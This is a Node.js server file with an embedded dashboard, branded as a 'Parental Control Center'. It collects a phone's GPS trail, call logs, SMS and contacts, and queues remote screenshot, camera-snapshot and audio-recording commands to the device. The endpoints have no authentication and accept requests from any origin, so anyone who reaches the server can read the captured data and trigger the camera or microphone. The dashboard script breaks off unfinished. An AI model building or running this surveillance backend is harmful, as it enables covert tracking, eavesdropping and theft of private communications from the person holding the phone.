'use strict';

const express = require('express');
const cors = require('cors');
const http = require('http');
const { Server } = require('socket.io');
const { Pool } = require('pg');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' } });

const PORT = Number(process.env.PORT) || 3000;
const MAX_MEMORY_POINTS = 2000;
const MAX_HISTORY_LIMIT = 5000;

app.use(cors());
app.use(express.json({ limit: '50kb' }));

// ─── DATABASE ─────────────────────────────────────────────────────────
let pool = null;
let dbReady = false;
let dbInitPromise = null;
const memoryHistory = [];

if (process.env.DATABASE_URL) {
    pool = new Pool({
        connectionString: process.env.DATABASE_URL,
        ssl: process.env.DATABASE_SSL === 'false' ? false : { rejectUnauthorized: false },
        max: 5,
        idleTimeoutMillis: 30000,
        connectionTimeoutMillis: 10000
    });
    pool.on('error', err => console.error('PostgreSQL pool error:', err.message));
    dbInitPromise = initializeDatabase();
} else {
    console.warn('DATABASE_URL not set. Data will be lost on restart.');
}

async function initializeDatabase() {
    try {
        // GPS location table
        await pool.query(`
            CREATE TABLE IF NOT EXISTS location_points (
                id BIGSERIAL PRIMARY KEY,
                latitude DOUBLE PRECISION NOT NULL,
                longitude DOUBLE PRECISION NOT NULL,
                recorded_at TIMESTAMPTZ NOT NULL,
                accuracy DOUBLE PRECISION,
                speed DOUBLE PRECISION,
                bearing DOUBLE PRECISION,
                payload JSONB NOT NULL DEFAULT '{}'::jsonb
            )
        `);
        await pool.query(`
            CREATE INDEX IF NOT EXISTS location_points_recorded_at_idx
            ON location_points (recorded_at DESC)
        `);

        // FIX #4: Monitor data table (calls, sms, contacts persistent)
        await pool.query(`
            CREATE TABLE IF NOT EXISTS monitor_snapshots (
                id BIGSERIAL PRIMARY KEY,
                data_type VARCHAR(20) NOT NULL,
                data JSONB NOT NULL,
                device_id VARCHAR(100) DEFAULT 'default',
                recorded_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
            )
        `);
        await pool.query(`
            CREATE INDEX IF NOT EXISTS monitor_snapshots_type_idx
            ON monitor_snapshots (data_type, recorded_at DESC)
        `);

        // FIX #3: Commands table with device_id (per-device queue)
        await pool.query(`
            CREATE TABLE IF NOT EXISTS device_commands (
                id BIGSERIAL PRIMARY KEY,
                command_id VARCHAR(50) UNIQUE NOT NULL,
                device_id VARCHAR(100) NOT NULL DEFAULT 'default',
                action VARCHAR(50) NOT NULL,
                params JSONB NOT NULL DEFAULT '{}'::jsonb,
                status VARCHAR(20) NOT NULL DEFAULT 'pending',
                result JSONB,
                created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
                executed_at TIMESTAMPTZ,
                expires_at TIMESTAMPTZ NOT NULL DEFAULT NOW() + INTERVAL '10 minutes'
            )
        `);
        await pool.query(`
            CREATE INDEX IF NOT EXISTS device_commands_device_idx
            ON device_commands (device_id, status, expires_at)
        `);

        dbReady = true;
        console.log('PostgreSQL ready — all tables initialized.');
        return true;
    } catch (err) {
        dbReady = false;
        console.error('Database initialization failed:', err.message);
        return false;
    }
}

async function ensureDatabase() {
    if (!pool) return false;
    if (dbReady) return true;
    if (dbInitPromise) { await dbInitPromise; if (dbReady) return true; }
    dbInitPromise = initializeDatabase();
    return await dbInitPromise;
}

// ─── HELPERS ──────────────────────────────────────────────────────────
function validCoordinate(value, min, max) {
    if (value === null || value === undefined || value === '') return false;
    const n = Number(value);
    return Number.isFinite(n) && n >= min && n <= max;
}
function finiteOptional(value) {
    if (value === null || value === undefined || value === '') return null;
    const n = Number(value);
    return Number.isFinite(n) ? n : null;
}
function parseTimestamp(value) {
    if (!value) return new Date();
    if (typeof value === 'number' || /^\d+$/.test(String(value))) {
        let n = Number(value);
        if (n > 0 && n < 100000000000) n *= 1000;
        const d = new Date(n);
        if (!isNaN(d.getTime())) return d;
    }
    const d = new Date(value);
    return isNaN(d.getTime()) ? new Date() : d;
}
function normalizeLocation(body) {
    return {
        ...body,
        latitude: Number(body.latitude),
        longitude: Number(body.longitude),
        timestamp: parseTimestamp(body.timestamp).getTime(),
        accuracy: finiteOptional(body.accuracy),
        speed: finiteOptional(body.speed),
        bearing: finiteOptional(body.bearing)
    };
}
function asPublicPoint(row) {
    const payload = row.payload || {};
    const recordedAt = row.recorded_at
        ? new Date(row.recorded_at).getTime()
        : Number(payload.timestamp) || Date.now();
    return {
        ...payload,
        id: row.id,
        latitude: Number(row.latitude),
        longitude: Number(row.longitude),
        timestamp: recordedAt,
        accuracy: row.accuracy == null ? finiteOptional(payload.accuracy) : Number(row.accuracy),
        speed: row.speed == null ? finiteOptional(payload.speed) : Number(row.speed),
        bearing: row.bearing == null ? finiteOptional(payload.bearing) : Number(row.bearing)
    };
}
async function saveLocation(data) {
    if (!pool) {
        memoryHistory.push(data);
        if (memoryHistory.length > MAX_MEMORY_POINTS)
            memoryHistory.splice(0, memoryHistory.length - MAX_MEMORY_POINTS);
        return data;
    }
    const ready = await ensureDatabase();
    if (!ready) throw new Error('Database unavailable.');
    const result = await pool.query(
        `INSERT INTO location_points (latitude,longitude,recorded_at,accuracy,speed,bearing,payload)
         VALUES ($1,$2,$3,$4,$5,$6,$7::jsonb)
         RETURNING id,latitude,longitude,recorded_at,accuracy,speed,bearing,payload`,
        [data.latitude, data.longitude, new Date(data.timestamp),
         data.accuracy, data.speed, data.bearing, JSON.stringify(data)]
    );
    return asPublicPoint(result.rows[0]);
}
function parseDateParam(value, endOfDay = false) {
    if (!value) return null;
    if (/^\d{4}-\d{2}-\d{2}$/.test(value)) {
        const d = new Date(value + (endOfDay ? 'T23:59:59.999' : 'T00:00:00.000'));
        return isNaN(d.getTime()) ? null : d;
    }
    const d = new Date(value);
    return isNaN(d.getTime()) ? null : d;
}
async function getHistory({ from, to, limit }) {
    const safeLimit = Math.min(MAX_HISTORY_LIMIT, Math.max(1, Number(limit) || 1000));
    if (!pool) {
        let rows = memoryHistory.slice();
        const fromDate = parseDateParam(from);
        const toDate = parseDateParam(to, true);
        if (fromDate) rows = rows.filter(p => Number(p.timestamp) >= fromDate.getTime());
        if (toDate) rows = rows.filter(p => Number(p.timestamp) <= toDate.getTime());
        return rows.slice(-safeLimit);
    }
    const ready = await ensureDatabase();
    if (!ready) throw new Error('Database unavailable.');
    const result = await pool.query(
        `SELECT id,latitude,longitude,recorded_at,accuracy,speed,bearing,payload
         FROM location_points
         WHERE ($1::timestamptz IS NULL OR recorded_at >= $1)
           AND ($2::timestamptz IS NULL OR recorded_at <= $2)
         ORDER BY recorded_at DESC LIMIT $3`,
        [parseDateParam(from), parseDateParam(to, true), safeLimit]
    );
    return result.rows.reverse().map(asPublicPoint);
}
function haversineMeters(a, b) {
    const R = 6371000, rad = v => v * Math.PI / 180;
    const dLat = rad(b.latitude - a.latitude), dLon = rad(b.longitude - a.longitude);
    const h = Math.sin(dLat/2)**2 + Math.cos(rad(a.latitude)) * Math.cos(rad(b.latitude)) * Math.sin(dLon/2)**2;
    return 2 * R * Math.atan2(Math.sqrt(h), Math.sqrt(Math.max(0, 1-h)));
}
function calculateDistanceMeters(points) {
    let t = 0;
    for (let i = 1; i < points.length; i++) t += haversineMeters(points[i-1], points[i]);
    return t;
}
function simplifyPoints(points, maxPoints = 100) {
    if (points.length <= maxPoints) return points;
    const step = (points.length - 1) / (maxPoints - 1);
    return Array.from({ length: maxPoints }, (_, i) => points[Math.round(i * step)]);
}

// ─── LOCATION ENDPOINT ────────────────────────────────────────────────
app.post('/location', async (req, res) => {
    try {
        const body = req.body || {};
        if (!validCoordinate(body.latitude, -90, 90) || !validCoordinate(body.longitude, -180, 180))
            return res.status(400).json({ message: 'Valid latitude and longitude required.' });
        const normalized = normalizeLocation(body);
        const saved = await saveLocation(normalized);
        io.emit('locationUpdate', saved);
        return res.status(200).json({ message: 'Location received successfully.', point: saved });
    } catch (err) {
        console.error('Failed to save location:', err.message);
        return res.status(503).json({ message: 'Could not save location.' });
    }
});

// ─── MONITOR ENDPOINTS (FIX #4: PostgreSQL persistent) ───────────────
app.post('/monitor', async (req, res) => {
    const { type, data, timestamp, deviceId = 'default' } = req.body || {};
    if (!type || !Array.isArray(data))
        return res.status(400).json({ message: 'type and data[] required.' });

    // Always store in memory for fast access
    if (!monitorMemory[deviceId]) monitorMemory[deviceId] = { calls: [], sms: [], contacts: [] };
    if (['calls', 'sms', 'contacts'].includes(type))
        monitorMemory[deviceId][type] = data;

    // Persist to PostgreSQL if available
    if (pool) {
        try {
            const ready = await ensureDatabase();
            if (ready) {
                await pool.query(
                    `INSERT INTO monitor_snapshots (data_type, data, device_id, recorded_at)
                     VALUES ($1, $2::jsonb, $3, NOW())`,
                    [type, JSON.stringify(data), deviceId]
                );
            }
        } catch (err) {
            console.error('Monitor persist error:', err.message);
        }
    }

    console.log(`Monitor: ${type} (${data.length} items) from device: ${deviceId}`);
    io.emit('monitorUpdate', { type, data, deviceId, timestamp: timestamp || Date.now() });
    res.status(200).json({ message: 'Monitor data received.' });
});

app.get('/monitor-data', async (req, res) => {
    const deviceId = req.query.deviceId || 'default';
    if (pool) {
        try {
            const ready = await ensureDatabase();
            if (ready) {
                // Get latest snapshot of each type
                const result = await pool.query(
                    `SELECT DISTINCT ON (data_type) data_type, data
                     FROM monitor_snapshots
                     WHERE device_id = $1
                     ORDER BY data_type, recorded_at DESC`,
                    [deviceId]
                );
                const out = { calls: [], sms: [], contacts: [] };
                result.rows.forEach(r => { out[r.data_type] = r.data; });
                return res.json(out);
            }
        } catch (err) {
            console.error('Monitor read error:', err.message);
        }
    }
    // Fallback to memory
    res.json(monitorMemory[deviceId] || { calls: [], sms: [], contacts: [] });
});

// Memory fallback for monitor
const monitorMemory = {};

// ─── COMMANDS (FIX #3: per-device queue + acknowledgment) ─────────────
const ALLOWED_ACTIONS = ['screenshot', 'camera_snapshot', 'start_audio', 'stop_audio', 'vibrate', 'get_status'];

app.post('/command', async (req, res) => {
    const { action, params = {}, deviceId = 'default' } = req.body || {};
    if (!action) return res.status(400).json({ message: 'action required.' });
    if (!ALLOWED_ACTIONS.includes(action)) return res.status(400).json({ message: 'Unknown action.' });

    const commandId = Date.now() + '_' + Math.random().toString(36).slice(2, 7);
    const command = { id: commandId, action, params, deviceId, createdAt: new Date().toISOString() };

    if (pool) {
        try {
            const ready = await ensureDatabase();
            if (ready) {
                await pool.query(
                    `INSERT INTO device_commands (command_id, device_id, action, params)
                     VALUES ($1, $2, $3, $4::jsonb)`,
                    [commandId, deviceId, action, JSON.stringify(params)]
                );
            }
        } catch (err) {
            console.error('Command save error:', err.message);
            // Fallback to memory
            if (!pendingCommandsMemory[deviceId]) pendingCommandsMemory[deviceId] = [];
            pendingCommandsMemory[deviceId].push(command);
        }
    } else {
        if (!pendingCommandsMemory[deviceId]) pendingCommandsMemory[deviceId] = [];
        pendingCommandsMemory[deviceId].push(command);
        if (pendingCommandsMemory[deviceId].length > 50)
            pendingCommandsMemory[deviceId].shift();
    }

    io.emit('newCommand', command);
    console.log(`Command queued: ${action} for device: ${deviceId}`);
    res.status(200).json({ message: 'Command queued.', command });
});

const pendingCommandsMemory = {};

// Android polls this — FIX #3: only returns commands for that specific device
app.get('/commands', async (req, res) => {
    const deviceId = req.query.deviceId || 'default';

    if (pool) {
        try {
            const ready = await ensureDatabase();
            if (ready) {
                const result = await pool.query(
                    `UPDATE device_commands
                     SET status = 'dispatched'
                     WHERE device_id = $1
                       AND status = 'pending'
                       AND expires_at > NOW()
                     RETURNING command_id, action, params, created_at`,
                    [deviceId]
                );
                return res.json(result.rows.map(r => ({
                    id: r.command_id, action: r.action,
                    params: r.params, createdAt: r.created_at
                })));
            }
        } catch (err) {
            console.error('Command poll error:', err.message);
        }
    }
    // Memory fallback
    const commands = pendingCommandsMemory[deviceId] || [];
    pendingCommandsMemory[deviceId] = [];
    res.json(commands);
});

// Android sends result back
app.post('/command-result', async (req, res) => {
    const { commandId, result, data, deviceId = 'default' } = req.body || {};
    console.log(`Command result: ${commandId} = ${result} from ${deviceId}`);

    if (pool && commandId) {
        try {
            const ready = await ensureDatabase();
            if (ready) {
                await pool.query(
                    `UPDATE device_commands
                     SET status = 'completed', result = $2::jsonb, executed_at = NOW()
                     WHERE command_id = $1`,
                    [commandId, JSON.stringify({ result, data })]
                );
            }
        } catch (err) {
            console.error('Command result save error:', err.message);
        }
    }

    io.emit('commandResult', { commandId, result, data, deviceId, receivedAt: Date.now() });
    res.status(200).json({ message: 'Result received.' });
});

// ─── OTHER ENDPOINTS ─────────────────────────────────────────────────
app.get('/latest', async (req, res) => {
    try {
        const h = await getHistory({ limit: 1, from: null, to: null });
        return res.json(h[h.length - 1] || null);
    } catch (err) { return res.status(503).json({ message: 'Could not load latest.' }); }
});
app.get('/history', async (req, res) => {
    try {
        const h = await getHistory({ from: req.query.from, to: req.query.to, limit: req.query.limit });
        return res.json(h);
    } catch (err) { return res.status(503).json({ message: 'Could not load history.' }); }
});
app.get('/matched-history', async (req, res) => {
    try {
        const history = await getHistory({ from: req.query.from, to: req.query.to, limit: req.query.limit || 1000 });
        const points = history.filter(p => Number.isFinite(Number(p.latitude)) && Number.isFinite(Number(p.longitude)))
            .map(p => ({ latitude: Number(p.latitude), longitude: Number(p.longitude), timestamp: Number(p.timestamp) }));
        if (points.length < 2) return res.json({ matched: false, reason: 'Need at least 2 points.', points, distanceMeters: 0 });
        const selected = simplifyPoints(points, 100);
        const coordinates = selected.map(p => `${p.longitude},${p.latitude}`).join(';');
        const timestamps = selected.map(p => Math.floor(p.timestamp / 1000)).join(';');
        const url = 'https://router.project-osrm.org/match/v1/driving/' + coordinates +
            '?overview=full&geometries=geojson&steps=false&timestamps=' + timestamps;
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 12000);
        let response;
        try { response = await fetch(url, { signal: controller.signal }); } finally { clearTimeout(timeout); }
        if (!response.ok) return res.status(502).json({ matched: false, reason: `OSRM HTTP ${response.status}.`, points: selected, distanceMeters: calculateDistanceMeters(selected) });
        const result = await response.json();
        if (result.code !== 'Ok' || !result.matchings?.length) return res.json({ matched: false, reason: 'No road match.', points: selected, distanceMeters: calculateDistanceMeters(selected) });
        const geometry = result.matchings.filter(m => m.geometry && Array.isArray(m.geometry.coordinates)).flatMap(m => m.geometry.coordinates);
        return res.json({ matched: true, geometry, points: selected,
            distanceMeters: result.matchings.reduce((s, m) => s + Number(m.distance||0), 0),
            durationSeconds: result.matchings.reduce((s, m) => s + Number(m.duration||0), 0) });
    } catch (err) { return res.status(502).json({ matched: false, reason: 'Road matching unavailable.' }); }
});
app.get('/health', async (req, res) => {
    let database = 'not-configured';
    if (pool) database = await ensureDatabase() ? 'connected' : 'unavailable';
    return res.json({ status: 'ok', database, storage: pool ? 'postgresql' : 'memory', uptimeSeconds: Math.round(process.uptime()), time: new Date().toISOString() });
});

// ─── DASHBOARD (FIX #1: removed ${data.length} server-side template bug) ──
app.get('/dashboard', (req, res) => {
    res.type('html').send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="theme-color" content="#0b1120">
<title>Parental Control Center</title>
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
<style>
:root{color-scheme:dark;--bg:#0b1120;--panel:#111b2e;--panel2:#17243a;--border:#293750;--text:#edf4ff;--muted:#91a4c1;--blue:#4f8cff;--green:#35d49a;--red:#ff647c;--purple:#a78bfa}
*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--text);font-family:Inter,system-ui,-apple-system,sans-serif}
button,input,select{font:inherit}
button{cursor:pointer;color:var(--text);background:var(--panel2);border:1px solid var(--border);border-radius:10px;padding:10px 12px}
button:hover{border-color:var(--blue)}
input,select{color:var(--text);background:#0b1424;border:1px solid var(--border);border-radius:9px;padding:10px;min-width:0}
.topbar{padding:17px 22px;display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap;background:#101a2c;border-bottom:1px solid var(--border)}
.brand{display:flex;align-items:center;gap:12px}
.logo{width:44px;height:44px;border-radius:14px;display:grid;place-items:center;background:linear-gradient(135deg,#397bff,#795bff);font-size:24px}
h1{font-size:19px;margin:0}.sub{color:var(--muted);font-size:12px;margin-top:4px}
.status{display:flex;align-items:center;gap:8px;font-size:13px;color:var(--muted)}
.dot{width:9px;height:9px;border-radius:50%;background:#8491a7}.dot.on{background:var(--green);box-shadow:0 0 12px #35d49a88}
.tabs{display:flex;gap:6px;padding:14px 22px;background:#0e1728;border-bottom:1px solid var(--border);flex-wrap:wrap}
.tab{padding:9px 18px;border-radius:10px;cursor:pointer;font-size:13px;background:transparent;border:1px solid transparent;color:var(--muted)}
.tab.active{background:var(--panel2);border-color:var(--border);color:var(--text)}
.page{display:none;padding:20px}.page.active{display:block}
.layout{display:grid;grid-template-columns:300px minmax(0,1fr);gap:16px}
.card{background:var(--panel);border:1px solid var(--border);border-radius:15px;padding:15px;margin-bottom:12px}
.cardtitle{font-size:12px;color:var(--muted);margin-bottom:9px}
.value{font-size:21px;font-weight:700;overflow-wrap:anywhere}
.small{font-size:12px;color:var(--muted);line-height:1.6;margin-top:7px;overflow-wrap:anywhere}
.grid2{display:grid;grid-template-columns:1fr 1fr;gap:9px}
.primary{background:var(--blue);border-color:var(--blue)}
.danger{background:#401e2b;border-color:#713043;color:var(--red)}
.full{width:100%;margin-bottom:8px}
.search{display:flex;gap:7px}.search input{width:100%}
#map{height:calc(100vh - 280px);min-height:420px;border:1px solid var(--border);border-radius:17px;overflow:hidden;background:var(--panel2)}
.actions{display:flex;gap:7px;flex-wrap:wrap;margin-bottom:12px}
.tablewrap{overflow:auto;border:1px solid var(--border);border-radius:12px}
table{width:100%;border-collapse:collapse;font-size:12px;white-space:nowrap}
th,td{text-align:left;padding:10px;border-bottom:1px solid var(--border)}
th{color:var(--muted);font-weight:600;background:#111b2e}tr:last-child td{border-bottom:0}
.green{color:var(--green)}.red{color:var(--red)}.blue{color:var(--blue)}
.cmd-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:16px}
.cmd-btn{padding:14px;text-align:center;border-radius:12px;font-size:13px}
.result-box{background:#0b1424;border:1px solid var(--border);border-radius:10px;padding:12px;font-size:12px;color:var(--muted);min-height:80px;margin-top:12px;white-space:pre-wrap;overflow-wrap:anywhere}
img.snapshot{max-width:100%;border-radius:10px;margin-top:10px;border:1px solid var(--border)}
@media(max-width:850px){.layout{grid-template-columns:1fr}#map{height:55vh;min-height:340px}}
</style>
</head>
<body>
<header class="topbar">
  <div class="brand"><div class="logo">⌖</div><div>
    <h1>Parental Control Center</h1>
    <div class="sub">Location · Monitor · Remote Commands</div>
  </div></div>
  <div class="status"><span class="dot" id="dot"></span><span id="connection">Connecting...</span></div>
</header>
<nav class="tabs">
  <button class="tab active" onclick="showPage(event,'location')">📍 Location</button>
  <button class="tab" onclick="showPage(event,'monitor')">📋 Monitor</button>
  <button class="tab" onclick="showPage(event,'commands')">⚡ Commands</button>
</nav>

<!-- LOCATION PAGE -->
<div id="page-location" class="page active">
<div class="layout">
<aside>
  <div class="card"><div class="cardtitle">Tracking status</div>
    <div class="value" id="tracking">Waiting for GPS</div>
    <div class="small" id="lastUpdate">No location received yet</div>
  </div>
  <div class="grid2">
    <div class="card"><div class="cardtitle">Latitude</div><div class="value" id="lat">—</div></div>
    <div class="card"><div class="cardtitle">Longitude</div><div class="value" id="lng">—</div></div>
    <div class="card"><div class="cardtitle">Accuracy</div><div class="value" id="accuracy">—</div></div>
    <div class="card"><div class="cardtitle">Speed</div><div class="value" id="speed">—</div></div>
  </div>
  <div class="card"><div class="cardtitle">Trail distance</div><div class="value" id="distance">0 m</div></div>
  <div class="card"><div class="cardtitle">History filter</div>
    <div class="small">From</div><input id="fromDate" type="date" style="width:100%">
    <div class="small">To</div><input id="toDate" type="date" style="width:100%;margin-top:6px">
    <div class="actions" style="margin-top:10px">
      <button class="primary" id="applyHistory">Load history</button>
      <button id="liveBtn">Live</button>
    </div>
    <div class="small" id="historyStatus">Showing live GPS.</div>
  </div>
  <div class="card"><div class="cardtitle">Find a place</div>
    <div class="search"><input id="place" placeholder="Search city...">
      <button class="primary" id="searchBtn">Go</button></div>
    <div class="small" id="searchStatus"></div>
  </div>
  <button class="full" id="centerBtn">◎ Center on latest</button>
</aside>
<main>
  <div class="actions">
    <button id="lightBtn">☀ Light</button><button id="darkBtn">☾ Dark</button>
    <button id="fitBtn">↗ Fit trail</button><button id="matchBtn">⌁ Match roads</button>
  </div>
  <div id="map"></div>
  <div class="small" id="mapStatus" style="margin-top:8px">Waiting for GPS data...</div>
  <div class="card" style="margin-top:12px"><div class="cardtitle">Recent points</div>
    <div class="tablewrap"><table><thead><tr>
      <th>Time</th><th>Latitude</th><th>Longitude</th><th>Accuracy</th><th>Speed</th>
    </tr></thead><tbody id="rows"><tr><td colspan="5">No points yet</td></tr></tbody></table></div>
  </div>
</main>
</div>
</div>

<!-- MONITOR PAGE -->
<div id="page-monitor" class="page">
  <div class="grid2" style="max-width:900px">
    <div class="card"><div class="cardtitle">📋 Call Logs</div>
      <div id="callPanel" class="small">No call data yet.</div></div>
    <div class="card"><div class="cardtitle">💬 SMS</div>
      <div id="smsPanel" class="small">No SMS data yet.</div></div>
  </div>
  <div class="card" style="max-width:900px">
    <!-- FIX #1: Removed server-side ${data.length} — now updated via JavaScript -->
    <div class="cardtitle">👥 Contacts (<span id="contactCount">0</span>)</div>
    <div id="contactPanel" class="small">No contact data yet.</div>
  </div>
</div>

<!-- COMMANDS PAGE -->
<div id="page-commands" class="page">
  <div style="max-width:700px">
    <div class="card">
      <div class="cardtitle">⚡ Remote Commands</div>
      <div class="small" style="margin-bottom:14px">
        Commands require Android app to be running and connected.
        Device ID: <input id="deviceIdInput" value="default" style="width:120px;padding:6px;font-size:12px">
      </div>
      <div class="cmd-grid">
        <button class="cmd-btn" onclick="sendCommand('get_status')">📊 Get Status</button>
        <button class="cmd-btn" onclick="sendCommand('vibrate')">📳 Vibrate</button>
        <button class="cmd-btn" onclick="sendCommand('screenshot')">📸 Screenshot</button>
        <button class="cmd-btn" onclick="sendCommand('camera_snapshot')">📷 Camera Snapshot</button>
        <button class="cmd-btn" onclick="sendCommand('start_audio')">🎙 Start Audio</button>
        <button class="cmd-btn danger" onclick="sendCommand('stop_audio')">⏹ Stop Audio</button>
      </div>
      <div class="cardtitle">Command result</div>
      <div class="result-box" id="cmdResult">No result yet.</div>
      <img id="cmdImage" class="snapshot" style="display:none">
    </div>
    <div class="card"><div class="cardtitle">Command history</div>
      <div class="tablewrap"><table><thead>
        <tr><th>Time</th><th>Action</th><th>Result</th></tr>
      </thead><tbody id="cmdHistory"><tr><td colspan="3">No commands yet</td></tr></tbody></table></div>
    </div>
  </div>
</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script src="/socket.io/socket.io.js"></script>
<script>
const $ = id => document.getElementById(id);

function showPage(event, name) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  $('page-' + name).classList.add('active');
  event.target.classList.add('active');
  if (name === 'location') setTimeout(() => map.invalidateSize(), 100);
  if (name === 'monitor') loadMonitorData();
}

// ── MAP ──────────────────────────────────────────────────────────────
const map = L.map('map').setView([20.5937, 78.9629], 5);
const lightLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',
  { maxZoom: 19, attribution: '&copy; OpenStreetMap contributors' });
const darkLayer = L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png',
  { maxZoom: 20, attribution: '&copy; OpenStreetMap contributors &copy; CARTO' });
lightLayer.addTo(map);
let activeLayer = 'light';
const trailLine = L.polyline([], { color: '#4f8cff', weight: 4, opacity: .9 }).addTo(map);
const matchedLine = L.polyline([], { color: '#35d49a', weight: 5, opacity: .9 }).addTo(map);
let marker = null, allPoints = [], latest = null, historyMode = false, searchMarker = null;

const socket = io();
socket.on('connect', () => { $('dot').classList.add('on'); $('connection').textContent = 'Connected'; });
socket.on('disconnect', () => { $('dot').classList.remove('on'); $('connection').textContent = 'Reconnecting...'; });

function validPoint(p) {
  const lat = Number(p.latitude), lng = Number(p.longitude);
  return Number.isFinite(lat) && Number.isFinite(lng) && lat >= -90 && lat <= 90 && lng >= -180 && lng <= 180;
}
function dateOf(p) { let n = Number(p.timestamp); if (n > 0 && n < 100000000000) n *= 1000; return new Date(n); }
function fmt(p) { return dateOf(p).toLocaleString(); }
function distM(points) {
  let t = 0;
  for (let i = 1; i < points.length; i++) t += map.distance([points[i-1].latitude, points[i-1].longitude], [points[i].latitude, points[i].longitude]);
  return t;
}
function distLabel(m) { return m >= 1000 ? (m/1000).toFixed(2)+' km' : Math.round(m)+' m'; }
function escHtml(v) { return String(v).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
function drawTrail(points) {
  const valid = points.filter(validPoint).map(p => ({...p, latitude: Number(p.latitude), longitude: Number(p.longitude)}));
  trailLine.setLatLngs(valid.map(p => [p.latitude, p.longitude]));
  $('distance').textContent = distLabel(distM(valid));
  renderTable(valid);
  if (!valid.length) { $('mapStatus').textContent = 'No GPS points.'; return; }
  const b = trailLine.getBounds();
  if (b.isValid()) map.fitBounds(b, { padding: [30,30], maxZoom: 16 });
  $('mapStatus').textContent = valid.length + ' GPS points shown.';
}
function updateMarker(p) {
  if (!validPoint(p)) return;
  const pos = [Number(p.latitude), Number(p.longitude)];
  if (!marker) {
    marker = L.circleMarker(pos, { radius: 9, color: '#fff', weight: 3, fillColor: '#4f8cff', fillOpacity: 1 }).addTo(map);
  } else marker.setLatLng(pos);
  marker.bindPopup('<b>Latest</b><br>Lat: '+Number(p.latitude).toFixed(6)+'<br>Lng: '+Number(p.longitude).toFixed(6)+'<br>'+fmt(p));
}
function updateMetrics(p) {
  $('tracking').textContent = 'GPS active';
  $('lat').textContent = Number(p.latitude).toFixed(6);
  $('lng').textContent = Number(p.longitude).toFixed(6);
  const acc = Number(p.accuracy), spd = Number(p.speed);
  $('accuracy').textContent = p.accuracy == null || !Number.isFinite(acc) ? '—' : Math.round(acc)+' m';
  $('speed').textContent = p.speed == null || !Number.isFinite(spd) ? '—' : (spd*3.6).toFixed(1)+' km/h';
  $('lastUpdate').textContent = 'Updated ' + fmt(p);
}
function renderTable(points) {
  const recent = points.slice(-12).reverse();
  if (!recent.length) { $('rows').innerHTML = '<tr><td colspan="5">No points yet</td></tr>'; return; }
  $('rows').innerHTML = recent.map(p => {
    const acc = Number(p.accuracy), spd = Number(p.speed);
    return '<tr><td>'+escHtml(fmt(p))+'</td><td>'+p.latitude.toFixed(6)+'</td><td>'+p.longitude.toFixed(6)+'</td><td>'+(p.accuracy==null||!Number.isFinite(acc)?'—':Math.round(acc)+' m')+'</td><td>'+(p.speed==null||!Number.isFinite(spd)?'—':(spd*3.6).toFixed(1)+' km/h')+'</td></tr>';
  }).join('');
}
function mergePoint(p) {
  if (!validPoint(p)) return;
  const point = {...p, latitude: Number(p.latitude), longitude: Number(p.longitude)};
  latest = point; updateMetrics(point); updateMarker(point);
  const i = allPoints.findIndex(x => Number(x.timestamp) === Number(point.timestamp) && x.latitude === point.latitude);
  if (i < 0) allPoints.push(point);
  allPoints.sort((a, b) => Number(a.timestamp) - Number(b.timestamp));
  if (allPoints.length > 5000) allPoints = allPoints.slice(-5000);
  if (!historyMode) { drawTrail(allPoints); map.panTo([point.latitude, point.longitude], { animate: true, duration: .35 }); }
}
socket.on('locationUpdate', p => { if (p) mergePoint(p); });

async function loadHistory() {
  historyMode = true; matchedLine.setLatLngs([]);
  $('historyStatus').textContent = 'Loading...';
  const params = new URLSearchParams({ limit: '5000' });
  if ($('fromDate').value) params.set('from', $('fromDate').value);
  if ($('toDate').value) params.set('to', $('toDate').value);
  try {
    const r = await fetch('/history?' + params);
    if (!r.ok) throw new Error();
    const data = await r.json();
    drawTrail(data);
    if (data.length) { updateMarker(data[data.length-1]); $('historyStatus').textContent = data.length + ' points.'; }
    else $('historyStatus').textContent = 'No points in range.';
  } catch { $('historyStatus').textContent = 'Load failed.'; }
}
async function returnToLive() {
  historyMode = false; matchedLine.setLatLngs([]);
  $('historyStatus').textContent = 'Live tracking.';
  try { const r = await fetch('/history?limit=2000'); if (r.ok) { const d = await r.json(); if (Array.isArray(d)) allPoints = d.filter(validPoint); } } catch {}
  allPoints.sort((a, b) => Number(a.timestamp) - Number(b.timestamp));
  drawTrail(allPoints);
  if (latest) { updateMarker(latest); map.setView([latest.latitude, latest.longitude], 16); }
}
async function matchRoads() {
  $('mapStatus').textContent = 'Matching to roads...';
  const params = new URLSearchParams({ limit: '1000' });
  if (historyMode && $('fromDate').value) params.set('from', $('fromDate').value);
  if (historyMode && $('toDate').value) params.set('to', $('toDate').value);
  try {
    const r = await fetch('/matched-history?' + params);
    const data = await r.json();
    if (data.matched && data.geometry?.length) { matchedLine.setLatLngs(data.geometry.map(c => [c[1],c[0]])); $('mapStatus').textContent = 'Road matched: '+distLabel(Number(data.distanceMeters)||0); }
    else { matchedLine.setLatLngs([]); $('mapStatus').textContent = (data.reason || 'No match')+' Raw trail shown.'; }
  } catch { matchedLine.setLatLngs([]); $('mapStatus').textContent = 'Road matching unavailable.'; }
}
$('lightBtn').addEventListener('click', () => { if (activeLayer==='light') return; map.removeLayer(darkLayer); lightLayer.addTo(map); activeLayer='light'; });
$('darkBtn').addEventListener('click', () => { if (activeLayer==='dark') return; map.removeLayer(lightLayer); darkLayer.addTo(map); activeLayer='dark'; });
